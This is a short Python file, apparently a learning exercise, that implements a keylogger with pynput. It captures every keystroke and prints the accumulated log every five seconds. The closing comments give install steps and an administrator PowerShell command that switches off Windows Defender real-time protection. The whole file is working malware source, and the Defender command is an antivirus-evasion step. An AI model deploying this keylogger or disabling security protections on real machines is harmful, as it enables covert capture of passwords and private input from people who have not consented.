#!/usr/bin/sh python

import pynput.keyboard
import threading


class Keylogger:
    def __init__(self):
        self.log = ""

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def report(self):
        print(self.log)
        self.log = ""
        timer = threading.Timer(5, self.report)
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()




# killall python

# need to install pynput in command
# pip install pynput


# Run powershell as administrator
# To disable Windows Defender:
# Set-MpPreference -DisableRealtimeMonitoring $true

# To enable Window Defender:
# Set-MpPreference -DisableRealtimeMonitoring $false